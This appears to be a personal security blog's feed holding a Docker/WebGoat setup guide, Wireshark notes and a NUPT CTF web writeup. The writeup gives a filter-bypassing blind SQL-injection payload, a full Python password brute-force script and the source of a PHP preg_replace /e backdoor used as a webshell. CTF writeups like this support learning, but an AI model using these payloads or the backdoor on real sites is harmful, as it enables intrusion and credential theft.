class="hljs-built_in">Import-Module</span> oh<span class="hljs-literal">-my</span><span class="hljs-literal">-posh</span><span class="hljs-built_in">Set-Theme</span> Paradox</code></pre><h4 id="常见故障及排除"><a href="#常见故障及排除" class="headerlink" title="常见故障及排除"></a>常见故障及排除</h4><h5 id="权限问题"><a href="#权限问题" class="headerlink" title="权限问题"></a>权限问题</h5><p>很多安装失败、无法访问xx路径可能是由于非管理员权限导致，重启terminal使用管理员身份运行。</p><h5 id="PowerShell脚本执行权限"><a href="#PowerShell脚本执行权限" class="headerlink" title="PowerShell脚本执行权限"></a>PowerShell脚本执行权限</h5><p>PowerShell 脚本 <code>.ps1</code> 有四种执行策略：</p><ul><li>Restricted —— 默认的设置， 不允许任何 script 运行</li><li>AllSigned —— 只能运行经过数字证书签名的 script</li><li>RemoteSigned —— 运行本地的 script 不需要数字签名，但是运行从网络上下载的 script 就必须要有数字签名</li><li>Unrestricted —— 允许所有的 script 运行</li></ul><p>输入下面的命令查看当前执行策略：</p><pre><code class="hljs text">get-executionpolicy</code></pre><p>而由于 PowerShell 每次打开都是通过一个 <code>.ps1</code> 脚本完成个性化配置的，所以失败很有可能是因为权限不足导致的。</p><p>通过下面命令更改执行策略：</p><pre><code class="hljs text">Set-ExecutionPolicy [[ 策略名 ]]</code></pre><p>调成 <code>RemoteSigned</code> 或者 <code>Unrestricted</code> 均可，建议前者。</p><p>之后重启终端就可以正常初始化了。</p>]]></content>
    
    
    <categories>
      
      <category>技术杂项</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Docker配置及WebGoat环境部署</title>
    <link href="/2018/03/22/Docker%E9%85%8D%E7%BD%AE%E5%8F%8AWebGoat%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    <url>/2018/03/22/Docker%E9%85%8D%E7%BD%AE%E5%8F%8AWebGoat%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/</url>
    
    <content type="html"><![CDATA[<h4 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h4><p>​    Docker 是流行的应用容器引擎，可以为应用创建轻量级且可移植的容器，很方便地在 Linux 环境中进行部署。本文简要讲解在 <strong>Ubuntu 16.04 LTS</strong> 操作系统下 docker 的配置，以及应用 docker 部署 OWASP 发布的渗透测试学习环境 WebGoat。</p><a id="more"></a><h4 id="0x01-Docker安装"><a href="#0x01-Docker安装" class="headerlink" title="0x01 Docker安装"></a>0x01 Docker安装</h4><ul><li><p>卸载旧版本</p><p>如果系统中曾经安装过旧版本的 docker ，需要使用以下命令卸载：</p><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo apt-get remove docker \</span>docker-engine \docker.io</code></pre></li><li><p>配置 APT</p><p>由于 apt 源使用 HTTPS 确保下载安全，因此首先要添加使用 HTTPS 传输的软件包以及 CA 证书：</p><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo apt-get update</span><span class="hljs-meta">$</span><span class="bash"> sudo apt-get install \</span>apt-transport-https \ca-certificates \curl \software-properties-common</code></pre></li><li><p>添加软件源</p><p>首先添加软件源的 GPG 密钥（在此选用速度较快的国内源）：</p><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</span><span class="hljs-meta">#</span><span class="bash"> 官方源</span><span class="hljs-meta">#</span><span class="bash"> $ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span></code></pre><p>然后向 source.list 中添加软件源：</p><pre><code class="hljs bash">$ sudo add-apt-repository \<span class="hljs-string">"deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu \</span><span class="hljs-string"><span class="hljs-variable">$(lsb_release -cs)</span> \</span><span class="hljs-string">stable"</span><span class="hljs-comment"># 官方源</span><span class="hljs-comment"># $ sudo add-apt-repository \</span><span class="hljs-comment"># "deb [arch=amd64] https://download.docker.com/linux/ubuntu \</span><span class="hljs-comment"># $(lsb_release -cs) \</span><span class="hljs-comment"># stable</span></code></pre></li><li><p>安装 Docker CE</p><p>更新 apt 软件包缓存，并安装 docker-ce：</p><pre><code class="hljs bash">$ sudo apt-get update$ sudo apt-get install docker-ce</code></pre></li></ul><h4 id="0x02-Docker-配置"><a href="#0x02-Docker-配置" class="headerlink" title="0x02 Docker 配置"></a>0x02 Docker 配置</h4><ul><li><p>启动 docker</p><p>使用以下命令启动 docker：</p><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo systemctl <span class="hljs-built_in">enable</span> docker</span><span class="hljs-meta">$</span><span class="bash"> sudo systemctl start docker</span></code></pre></li><li><p>建立 docker 用户组</p><p>​    默认情况下， docker 命令会使用 Unix socket 与 Docker 引擎通讯。 而只有 root 用户和 docker 组的用户才可以访问Docker 引擎的 Unix socket。 出于安全考虑， 一般 Linux 系统上不会直接使用 root 用户。 因此， 更好地做法是将需要使用 docker 的用户加入 docker用户组。</p><p>首先建立 docker 组：</p><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo groupadd docker</span></code></pre><p>将当前用户加入 docker 组：</p><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo usermod -aG docker <span class="hljs-variable">$USER</span></span></code></pre><p>退出当前终端并重新登录即可。</p></li><li><p>配置镜像加速</p><p>​    鉴于国内网络问题，从 Docker Hub 拉取 docker 镜像会很缓慢，可以配置镜像加速器。Docker 官方和阿里云等很多国内云服务商都提供了国内加速器服务。在此以 Docker 官方加速器为例。</p><p>在 /etc/docker/daemon.json 中写入如下内容（ 如果文件不存在请新建该文件） ：</p><pre><code class="hljs json">&#123;<span class="hljs-attr">"registry-mirrors"</span>: [<span class="hljs-string">"https://registry.docker-cn.com"</span>]&#125;</code></pre><p>然后重新启动服务：</p><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo systemctl daemon-reload</span><span class="hljs-meta">$</span><span class="bash"> sudo systemctl restart docker</span></code></pre></li><li><p>测试配置是否成功</p><p>创建一个 Hello World 容器来测试 docker 是否正确安装配置：</p><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> docker run hello-world</span>Unable to find image 'hello-world:latest' locallylatest: Pulling from library/hello-worldca4f61b1923c: Pull completeDigest: sha256:be0cd392e45be79ffeffa6b05338b98ebb16c87b255f48e297ec7f98e123905cStatus: Downloaded newer image for hello-world:latestHello from Docker!This message shows that your installation appears to be working correctly.To generate this message, Docker took the following steps:1. The Docker client contacted the Docker daemon.2. The Docker daemon pulled the "hello-world" image from the Docker Hub.(amd64)3. The Docker daemon created a new container from that image which runs theexecutable that produces the output you are currently reading.4. The Docker daemon streamed that output to the Docker client, which sent itto your terminal.To try something more ambitious, you can run an Ubuntu container with:<span class="hljs-meta">$</span><span class="bash"> docker run -it ubuntu bash</span>Share images, automate workflows, and more with a free Docker ID:https://cloud.docker.com/For more examples and ideas, visit:https://docs.docker.com/engine/userguide/</code></pre><p>输出以上信息说明配置成功。</p></li></ul><h4 id="0x03-部署WebGoat"><a href="#0x03-部署WebGoat" class="headerlink" title="0x03 部署WebGoat"></a>0x03 部署WebGoat</h4><p>WebGoat 提供了docker 镜像，只需要从 docker-hub 中拉取即可：</p><pre><code class="hljs angelscript">$ docker pull webgoat/webgoat<span class="hljs-number">-7.1</span>$ docker run -p <span class="hljs-number">8080</span>:<span class="hljs-number">8080</span> -t webgoat/webgoat<span class="hljs-number">-7.1</span></code></pre><p>这样就成功部署并启动了包含 WebGoat 的容器。访问 <a href="http://127.0.0.1:8080/WebGoat/login.mvc" target="_blank" rel="noopener">http://127.0.0.1:8080/WebGoat/login.mvc</a>  即可。</p><p>参考书目：《Docker — 从入门到实践 》（<a href="https://www.gitbook.com/book/yeasy/docker_practice/details）" target="_blank" rel="noopener">https://www.gitbook.com/book/yeasy/docker_practice/details）</a></p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>南邮CTF平台-Web-综合题2 Writeup</title>
    <link href="/2018/02/02/%E5%8D%97%E9%82%AECTF%E5%B9%B3%E5%8F%B0-Web-%E7%BB%BC%E5%90%88%E9%A2%982-Writeup/"/>
    <url>/2018/02/02/%E5%8D%97%E9%82%AECTF%E5%B9%B3%E5%8F%B0-Web-%E7%BB%BC%E5%90%88%E9%A2%982-Writeup/</url>
    
    <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>南邮ctf平台上的一道web题，比较综合。</p><a id="more"></a><p><img src="http://oyl6hshyb.bkt.clouddn.com/pics/180130/4H3EEAa0fk.png?imageslim" srcset="/img/loading.gif" alt="mark"></p><p>题目页面如下：</p><p><img src="http://oyl6hshyb.bkt.clouddn.com/pics/180130/ehdl8J0FJJ.png?imageslim" srcset="/img/loading.gif" alt="mark"></p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><h4 id="1-收集信息"><a href="#1-收集信息" class="headerlink" title="1. 收集信息"></a>1. 收集信息</h4><p>首先收集一下可用的信息，看到页面最下方有一个“本CMS说明”，打开看看，果然是 hint ：</p><p><img src="http://oyl6hshyb.bkt.clouddn.com/pics/180130/dikhaH7bD1.png?imageslim" srcset="/img/loading.gif" alt="mark"></p><p>注意放大部分，使用GET方法获取一个文件参数file以读取文件，我们可以如法炮制，读取网站中各文件的内容，其中比较关键的页面源码如下：</p><ul><li>passencode.php 内容：</li></ul><pre><code class="hljs php">&lt;meta http-equiv=<span class="hljs-string">"Content-Type"</span> content=<span class="hljs-string">"text/html; charset=utf-8"</span> /&gt;<span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">passencode</span><span class="hljs-params">($content)</span></span>&#123;<span class="hljs-comment">//$pass=urlencode($content);</span>$array=str_split($content);$pass=<span class="hljs-string">""</span>;<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;count($array);$i++)&#123;<span class="hljs-keyword">if</span>($pass!=<span class="hljs-string">""</span>)&#123;$pass=$pass.<span class="hljs-string">" "</span>.(string)ord($array[$i]);&#125;<span class="hljs-keyword">else</span>&#123;$pass=(string)ord($array[$i]);&#125;&#125;<span class="hljs-keyword">return</span> $pass;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>可见网站加密密码的方法就是……取ASCII码（hhh……），这个在后面会用到。</p><ul><li>config.php</li></ul><p>在试图读取这个看起来很可能存在有用信息的 config.php 文件时遇到了问题：</p><p><img src="http://oyl6hshyb.bkt.clouddn.com/pics/180130/L4ImD7bdm5.png?imageslim" srcset="/img/loading.gif" alt="mark"></p><p>暂时跳过，最后在 about.php 中发现了原因：</p><ul><li>about.php 内容：</li></ul><pre><code class="hljs php">&lt;meta http-equiv=<span class="hljs-string">"Content-Type"</span> content=<span class="hljs-string">"text/html; charset=utf-8"</span> /&gt;<span class="hljs-meta">&lt;?php</span>$file=$_GET[<span class="hljs-string">'file'</span>];<span class="hljs-keyword">if</span>($file==<span class="hljs-string">""</span> || strstr($file,<span class="hljs-string">'config.php'</span>))&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"file参数不能为空！"</span>;<span class="hljs-keyword">exit</span>();&#125;<span class="hljs-keyword">else</span>&#123;$cut=strchr($file,<span class="hljs-string">"loginxlcteam"</span>);<span class="hljs-keyword">if</span>($cut==<span class="hljs-keyword">false</span>)&#123;$data=file_get_contents($file);$date=htmlspecialchars($data);<span class="hljs-keyword">echo</span> $date;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;script&gt;alert('敏感目录，禁止查看！但是。。。')&lt;/script&gt;"</span>;&#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>在 about.php 中除了过滤 config.php 使其不能被访问以外，还读到了一个名为 loginxlcteam 的文件目录，尝试打开，发现是站点后台：</p><p><img src="http://oyl6hshyb.bkt.clouddn.com/pics/180130/C3AcBhbEKc.png?imageslim" srcset="/img/loading.gif" alt="mark"></p><p>虽然不能读到页面的源代码，但是通过尝试登录可以发现错误提示中包含的一些信息。比如，用户名输入 admin ，密码任意输入时，提示为“密码错误”，而用户名输入其他任意字符串，则提示“用户名不存在”，因此可初步认为后台管理用户名为 admin。</p><h4 id="2-SQL注入"><a href="#2-SQL注入" class="headerlink" title="2. SQL注入"></a>2. SQL注入</h4><p>页面里有查询和留言功能，所以首先想到的攻击点是SQL注入和XSS,因为题目明确了“非XSS题”，所以猜想最可能的点是SQL注入。</p><p>尝试在留言搜索框中随便输入点什么，得到如下提示：</p><p><img src="http://oyl6hshyb.bkt.clouddn.com/pics/180130/Dj17b0428H.png?imageslim" srcset="/img/loading.gif" alt="mark"></p><p>看到“本公司开发的浏览器”，首先想到的就是 http header 中的 user-agent ，又发现跳转到的是一个之前没有见过的页面 so.php , 故读取一下该文件，得到源码：</p><ul><li>so.php 内容</li></ul><pre><code class="hljs php">&lt;meta http-equiv=<span class="hljs-string">"Content-Type"</span> content=<span class="hljs-string">"text/html; charset=utf-8"</span> /&gt;&lt;!DOCTYPE html <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="hljs-string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;&lt;html xmlns=<span class="hljs-string">"http://www.w3.org/1999/xhtml"</span>&gt;&lt;head&gt;&lt;meta http-equiv=<span class="hljs-string">"Content-Type"</span> content=<span class="hljs-string">"text/html; charset=utf-8"</span> /&gt;&lt;title&gt;搜索留言&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;center&gt;&lt;div id=<span class="hljs-string">"say"</span> name=<span class="hljs-string">"say"</span> align=<span class="hljs-string">"left"</span> style=<span class="hljs-string">"width:1024px"</span>&gt;<span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>($_SERVER[<span class="hljs-string">'HTTP_USER_AGENT'</span>]!=<span class="hljs-string">"Xlcteam Browser"</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">'万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~'</span>;    <span class="hljs-keyword">exit</span>();&#125;$id=$_POST[<span class="hljs-string">'soid'</span>];<span class="hljs-keyword">include</span> <span class="hljs-string">'config.php'</span>;<span class="hljs-keyword">include</span> <span class="hljs-string">'antiinject.php'</span>;<span class="hljs-keyword">include</span> <span class="hljs-string">'antixss.php'</span>;$id=antiinject($id);$con = mysql_connect($db_address,$db_user,$db_pass) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"不能连接到数据库！！"</span>.mysql_error());mysql_select_db($db_name,$con);$id=mysql_real_escape_string($id);$result=mysql_query(<span class="hljs-string">"SELECT * FROM `message` WHERE display=1 AND id=$id"</span>);$rs=mysql_fetch_array($result);<span class="hljs-keyword">echo</span> htmlspecialchars($rs[<span class="hljs-string">'nice'</span>]).<span class="hljs-string">':&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;'</span>.antixss($rs[<span class="hljs-string">'say'</span>]).<span class="hljs-string">'&lt;br /&gt;'</span>;mysql_free_result($result);mysql_free_result($file);mysql_close($con);<span class="hljs-meta">?&gt;</span>&lt;/div&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;gt;</code></pre><p>得到 user-agent 为：Xlcteam Browser。还发现了注入点和一个反注入机制，如下：</p><ul><li>antiinject.php 内容：</li></ul><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">antiinject</span><span class="hljs-params">($content)</span></span>&#123;$keyword=<span class="hljs-keyword">array</span>(<span class="hljs-string">"select"</span>,<span class="hljs-string">"union"</span>,<span class="hljs-string">"and"</span>,<span class="hljs-string">"from"</span>,<span class="hljs-string">' '</span>,<span class="hljs-string">"'"</span>,<span class="hljs-string">";"</span>,<span class="hljs-string">'"'</span>,<span class="hljs-string">"char"</span>,<span class="hljs-string">"or"</span>,<span class="hljs-string">"count"</span>,<span class="hljs-string">"master"</span>,<span class="hljs-string">"name"</span>,<span class="hljs-string">"pass"</span>,<span class="hljs-string">"admin"</span>,<span class="hljs-string">"+"</span>,<span class="hljs-string">"-"</span>,<span class="hljs-string">"order"</span>,<span class="hljs-string">"="</span>);$info=strtolower($content);<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;=count($keyword);$i++)&#123; $info=str_replace($keyword[$i], <span class="hljs-string">''</span>,$info);&#125;<span class="hljs-keyword">return</span> $info;&#125;<span class="hljs-meta">?&gt;</span>gt;</code></pre><p>逻辑就是把输入中的敏感关键字和符号替换为空，可以采用形如“sSELECTelect”的方法来绕过。</p><p>在 sm.txt 中已经给出了 admin 表的结构，构造 payload 试探出 userpass 字段的长度为34：</p><pre><code class="hljs sql">soid=1/**/aANDnd/**/exists(sSELECTelect/**/*/**/fFROMrom/**/aADMINdmin/**/where/**/length(userpPASSass)&gt;33)</code></pre><p>爆破一下密码，脚本如下：</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> datetimeurl = <span class="hljs-string">'http://cms.nuptzj.cn/so.php'</span>header = &#123;<span class="hljs-string">'Host'</span>:<span class="hljs-string">'cms.nuptzj.cn'</span>,<span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'Xlcteam Browser'</span> ,&#125;charset = <span class="hljs-string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>print(<span class="hljs-string">"[*]Start cracking..."</span>)result= <span class="hljs-string">""</span>starttime = datetime.datetime.now()<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">35</span>):    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> charset:        char = str(ord(i))        num = str(j)        payload = <span class="hljs-string">'1/**/aANDnd/**/exists(sSELECTelect/**/*/**/fFROMrom/**/aADMINdmin/**/WHERE/**/oORrd(substring(userpPASSass/**/fFROMrom/**/&#123;0&#125;/**/foORr/**/1))&gt;&#123;1&#125;)'</span>.format(num,char)        data = &#123;            <span class="hljs-string">"soid"</span>:payload        &#125;        response = requests.post(url=url,headers=header,data=data)        result_len = len(str(response.text))        <span class="hljs-keyword">if</span>(result_len &lt; <span class="hljs-number">430</span>):            result = result + chr(int(char))            <span class="hljs-keyword">break</span>endtime = datetime.datetime.now()print(<span class="hljs-string">"[*]passwd is: "</span> + result)print(<span class="hljs-string">"[*]time:%ds"</span> % (endtime - starttime).seconds)</code></pre><p>得到密码的 ASCII 码：，对应字符串 fuckruntu：</p><p><img src="http://oyl6hshyb.bkt.clouddn.com/pics/180201/CEG80LflIm.png?imageslim" srcset="/img/loading.gif" alt="mark"></p><p>使用用户名 admin，密码 fuckruntu 成功登录后台。</p><h4 id="3-一句话木马"><a href="#3-一句话木马" class="headerlink" title="3.一句话木马"></a>3.一句话木马</h4><p>后台页面如下：</p><p><img src="http://oyl6hshyb.bkt.clouddn.com/pics/180201/5FiGAhH5g9.png?imageslim" srcset="/img/loading.gif" alt="mark"></p><p>xlcteam.php 的源码如下：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> $e = $_REQUEST[<span class="hljs-string">'www'</span>]; $arr = <span class="hljs-keyword">array</span>($_POST[<span class="hljs-string">'wtf'</span>] =&gt; <span class="hljs-string">'|.*|e'</span>,); array_walk($arr, $e, <span class="hljs-string">''</span>); <span class="hljs-meta">?&gt;</span></code></pre><p>查了一下，这是一个利用了php中回调函数的后门，可以使 www 为 preg_replace 函数，当 array_walk()  将函数作用于数组时， POST 传入的数据作为 preg_replace() 的第二个参数，在替换后被当做 php 代码执行（在php5.3下可用，5.5后preg_replace函数已弃用了使替换后的字符串作为php代码执行的/e修饰符）。测试如下：</p><p><img src="http://oyl6hshyb.bkt.clouddn.com/pics/180202/cB95dj8hC3.png?imageslim" srcset="/img/loading.gif" alt="mark"></p><p>然后用某菜刀连一下这个shell，获取到服务器的文件：</p><p><img src="http://oyl6hshyb.bkt.clouddn.com/pics/180202/273e2d3KIm.png?imageslim" srcset="/img/loading.gif" alt="mark"></p><p>打开文件“恭喜你获得flag2.txt”，获得 flag：<strong>nctf{you_are_s0_g00d_hacker}</strong>。</p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据包分析笔记（一）</title>
    <link href="/2017/12/03/%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2017/12/03/%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近看了一个wireshark数据包分析的系列网课，算是……重温一下<del>计网</del>网络协议的一些知识。简单记录一下知识点，写给自己看的可能比较杂乱，<del>访客</del>（别做梦了你哪来的访客hhh）就见谅了。</p><a id="more"></a><h3 id="第一章-基础篇"><a href="#第一章-基础篇" class="headerlink" title="第一章 基础篇"></a>第一章 基础篇</h3><h4 id="1-认识wireshark的界面"><a href="#1-认识wireshark的界面" class="headerlink" title="1.认识wireshark的界面"></a>1.认识wireshark的界面</h4><h5 id="packet-detail中需注意的几个字段"><a href="#packet-detail中需注意的几个字段" class="headerlink" title="packet detail中需注意的几个字段"></a>packet detail中需注意的几个字段</h5><ul><li>物理层帧的结构：<ul><li>Protocols in frame:包含该帧中各层次协议。</li><li>Coloring Rule Name:着色规则名称（？）</li></ul></li><li>数据链路层结构：<ul><li>Destination/Source:目的/源MAC地址（前三个字节为厂商信息）</li></ul></li><li>物理层数据帧的情况</li></ul><pre><code class="hljs yaml"><span class="hljs-attr">Frame 3934:</span> <span class="hljs-number">310</span> <span class="hljs-string">bytes</span> <span class="hljs-string">on</span> <span class="hljs-string">wire</span> <span class="hljs-string">(2480</span> <span class="hljs-string">bits),</span> <span class="hljs-number">310</span> <span class="hljs-string">bytes</span> <span class="hljs-string">captured</span> <span class="hljs-string">(2480</span> <span class="hljs-string">bits)</span> <span class="hljs-string">on</span> <span class="hljs-string">interface</span> <span class="hljs-number">0</span><span class="hljs-comment"># 3934号帧，线路上有310个字节，实际捕获310个字节</span><span class="hljs-attr">Interface id:</span> <span class="hljs-number">0</span> <span class="hljs-string">(\Device\NPF_&#123;EF10E4D3-713B-4239-8786-300C825A9D3F&#125;)</span><span class="hljs-comment"># 接口id</span><span class="hljs-attr">Encapsulation type:</span> <span class="hljs-string">Ethernet</span> <span class="hljs-string">(1)</span><span class="hljs-comment"># 封装类型</span><span class="hljs-attr">Arrival Time:</span> <span class="hljs-string">Nov</span> <span class="hljs-number">26</span><span class="hljs-string">,</span> <span class="hljs-number">2015</span> <span class="hljs-number">11</span><span class="hljs-string">:54:10.987177000</span> <span class="hljs-string">中国标准时间</span><span class="hljs-comment"># 捕获日期和时间</span><span class="hljs-string">[Time</span> <span class="hljs-attr">shift for this packet:</span> <span class="hljs-number">0.000000000</span> <span class="hljs-string">seconds]</span><span class="hljs-attr">Epoch Time:</span> <span class="hljs-number">1448510050.987177000</span> <span class="hljs-string">seconds</span><span class="hljs-string">[Time</span> <span class="hljs-attr">delta from previous captured frame:</span> <span class="hljs-number">0.014178000</span> <span class="hljs-string">seconds]</span><span class="hljs-comment"># 当前数据包与前一个数据包的时间间隔</span><span class="hljs-string">[Time</span> <span class="hljs-attr">delta from previous displayed frame:</span> <span class="hljs-number">0.311034000</span> <span class="hljs-string">seconds]</span><span class="hljs-string">[Time</span> <span class="hljs-attr">since reference or first frame:</span> <span class="hljs-number">10.449670000</span> <span class="hljs-string">seconds]</span><span class="hljs-comment"># 当前数据包与第一个数据包的时间间隔</span><span class="hljs-attr">Frame Number:</span> <span class="hljs-number">3934</span><span class="hljs-comment"># 帧序号</span><span class="hljs-attr">Frame Length:</span> <span class="hljs-number">310</span> <span class="hljs-string">bytes</span> <span class="hljs-string">(2480</span> <span class="hljs-string">bits)</span><span class="hljs-comment"># 帧长度</span><span class="hljs-attr">Capture Length:</span> <span class="hljs-number">310</span> <span class="hljs-string">bytes</span> <span class="hljs-string">(2480</span> <span class="hljs-string">bits)</span><span class="hljs-comment"># 捕获长度</span><span class="hljs-string">[Frame</span> <span class="hljs-attr">is marked:</span> <span class="hljs-literal">False</span><span class="hljs-string">]</span><span class="hljs-comment"># 此帧是否做了标记：否</span><span class="hljs-string">[Frame</span> <span class="hljs-attr">is ignored:</span> <span class="hljs-literal">False</span><span class="hljs-string">]</span><span class="hljs-comment"># 此帧是否被忽略：否</span><span class="hljs-string">[Protocols</span> <span class="hljs-attr">in frame:</span> <span class="hljs-string">eth:ethertype:ip:tcp:http:image-gif]</span><span class="hljs-comment"># 帧内封装的协议层次结构</span><span class="hljs-string">[Number</span> <span class="hljs-attr">of per-protocol-data:</span> <span class="hljs-number">1</span><span class="hljs-string">]</span><span class="hljs-string">[Hypertext</span> <span class="hljs-string">Transfer</span> <span class="hljs-string">Protocol,</span> <span class="hljs-string">key</span> <span class="hljs-number">0</span><span class="hljs-string">]</span><span class="hljs-string">[Coloring</span> <span class="hljs-attr">Rule Name:</span> <span class="hljs-string">HTTP]</span><span class="hljs-comment"># 着色标记的协议名称</span><span class="hljs-string">[Coloring</span> <span class="hljs-attr">Rule String:</span> <span class="hljs-string">http</span> <span class="hljs-string">||</span> <span class="hljs-string">tcp.port</span> <span class="hljs-string">==</span> <span class="hljs-number">80</span> <span class="hljs-string">||</span> <span class="hljs-string">http2]</span><span class="hljs-string">着色规则显示的字符串</span></code></pre><ul><li>数据链路层以太网帧头部的信息</li></ul><pre><code class="hljs css"><span class="hljs-selector-tag">Ethernet</span> <span class="hljs-selector-tag">II</span>, <span class="hljs-selector-tag">Src</span>: <span class="hljs-selector-tag">Qihoo360_61</span><span class="hljs-selector-pseudo">:0b</span><span class="hljs-selector-pseudo">:0c</span> (<span class="hljs-selector-tag">d0</span><span class="hljs-selector-pseudo">:fa</span><span class="hljs-selector-pseudo">:1d</span><span class="hljs-selector-pseudo">:61</span><span class="hljs-selector-pseudo">:0b</span><span class="hljs-selector-pseudo">:0c)</span>, <span class="hljs-selector-tag">Dst</span>: <span class="hljs-selector-tag">Giga-Byt_d4</span><span class="hljs-selector-pseudo">:be</span><span class="hljs-selector-pseudo">:c9</span> (94<span class="hljs-selector-pseudo">:de</span><span class="hljs-selector-pseudo">:80</span><span class="hljs-selector-pseudo">:d4</span><span class="hljs-selector-pseudo">:be</span><span class="hljs-selector-pseudo">:c9)</span><span class="hljs-selector-tag">Destination</span>: <span class="hljs-selector-tag">Giga-Byt_d4</span><span class="hljs-selector-pseudo">:be</span><span class="hljs-selector-pseudo">:c9</span> (94<span class="hljs-selector-pseudo">:de</span><span class="hljs-selector-pseudo">:80</span><span class="hljs-selector-pseudo">:d4</span><span class="hljs-selector-pseudo">:be</span><span class="hljs-selector-pseudo">:c9)</span># 目标<span class="hljs-selector-tag">MAC</span>地址<span class="hljs-selector-tag">Source</span>: <span class="hljs-selector-tag">Qihoo360_61</span><span class="hljs-selector-pseudo">:0b</span><span class="hljs-selector-pseudo">:0c</span> (<span class="hljs-selector-tag">d0</span><span class="hljs-selector-pseudo">:fa</span><span class="hljs-selector-pseudo">:1d</span><span class="hljs-selector-pseudo">:61</span><span class="hljs-selector-pseudo">:0b</span><span class="hljs-selector-pseudo">:0c)</span># 源<span class="hljs-selector-tag">MAC</span>地址<span class="hljs-selector-tag">Type</span>: <span class="hljs-selector-tag">IP</span> (0<span class="hljs-selector-tag">x0800</span>)# 需要说明的是，为什么上述的源<span class="hljs-selector-tag">MAC</span>地址以及目标<span class="hljs-selector-tag">MAC</span>地址的开头明明是“<span class="hljs-selector-tag">d0</span><span class="hljs-selector-pseudo">:fa</span><span class="hljs-selector-pseudo">:1d</span>”以及“94<span class="hljs-selector-pseudo">:de</span><span class="hljs-selector-pseudo">:80</span>”，但是<span class="hljs-selector-tag">Wireshark</span>上显示出来的却是“<span class="hljs-selector-tag">Qihoo360</span>”以及“<span class="hljs-selector-tag">Giga-Byt</span>”呢？这是因为<span class="hljs-selector-tag">MAC</span>地址的前3个字节表示厂商。而“<span class="hljs-selector-tag">d0</span><span class="hljs-selector-pseudo">:fa</span><span class="hljs-selector-pseudo">:1d</span>”以及“94<span class="hljs-selector-pseudo">:de</span><span class="hljs-selector-pseudo">:80</span>”被分配给了奇虎以及技嘉公司。这是全球统一标准，所以<span class="hljs-selector-tag">Wireshark</span>干脆显示出厂商名称了。</code></pre><ul><li>网络层IP包的头部信息</li></ul><pre><code class="hljs yaml"><span class="hljs-string">Internet</span> <span class="hljs-string">Protocol</span> <span class="hljs-string">Version</span> <span class="hljs-number">4</span><span class="hljs-string">,</span> <span class="hljs-attr">Src:</span> <span class="hljs-number">220.181</span><span class="hljs-number">.7</span><span class="hljs-number">.190</span> <span class="hljs-string">(220.181.7.190),</span> <span class="hljs-attr">Dst:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.14</span> <span class="hljs-string">(192.168.0.14)</span><span class="hljs-attr">Version:</span> <span class="hljs-number">4</span><span class="hljs-comment"># 